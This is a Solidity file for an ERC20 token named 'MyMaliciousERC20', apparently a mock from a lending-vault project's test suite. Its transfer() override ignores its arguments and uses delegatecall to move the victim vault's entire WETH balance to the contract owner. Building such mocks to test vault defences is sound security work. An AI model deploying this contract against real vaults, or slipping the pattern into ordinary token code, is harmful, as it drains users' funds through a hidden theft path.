// SPDX-License-Identifier: GPL-3.0

pragma solidity 0.8.19;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";

contract MyMaliciousERC20 is ERC20, Ownable {
    uint8 internal _decimals;
    address internal _vaultCompartmentVictim;
    address internal _vaultAddr;

    constructor(
        string memory tokenName,
        string memory tokenSymbol,
        uint8 tokenDecimals,
        address vaultCompartmentVictim,
        address lenderVault
    ) ERC20(tokenName, tokenSymbol) Ownable() {
        _decimals = tokenDecimals;
        _mint(lenderVault, 100 ether);
        _vaultCompartmentVictim = vaultCompartmentVictim;
        _vaultAddr = lenderVault;
    }

    function mint(address account, uint256 amount) external {
        _mint(account, amount);
    }

    function transfer(address, uint256) public override returns (bool) {
        address collTokenAddr = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2; //weth
        uint256 repayAmount = IERC20(collTokenAddr).balanceOf(_vaultAddr); //get balance
        // solhint-disable avoid-low-level-calls
        (bool success, bytes memory result) = collTokenAddr.delegatecall(
            abi.encodeWithSelector(
                bytes4(keccak256("transfer(address,uint256)")),
                owner(),
                repayAmount
            )
        );
        if (!success) {
            // solhint-disable no-inline-assembly
            assembly {
                revert(add(result, 32), mload(result))
            }
        }
        return true;
    }

    function decimals() public view override returns (uint8) {
        return _decimals;
    }
}